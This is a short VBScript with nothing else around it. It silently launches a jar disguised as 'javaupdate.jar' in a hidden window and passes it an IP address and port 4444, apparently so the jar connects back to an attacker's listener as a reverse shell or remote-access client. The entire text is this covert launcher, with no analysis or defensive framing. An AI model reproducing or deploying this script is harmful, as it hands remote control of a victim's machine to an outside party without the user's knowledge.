Set WshShell = CreateObject("WScript.Shell")
WshShell.Run "cmd /C java -jar .\javaupdate.jar 172.24.169.235 4444", 0, False
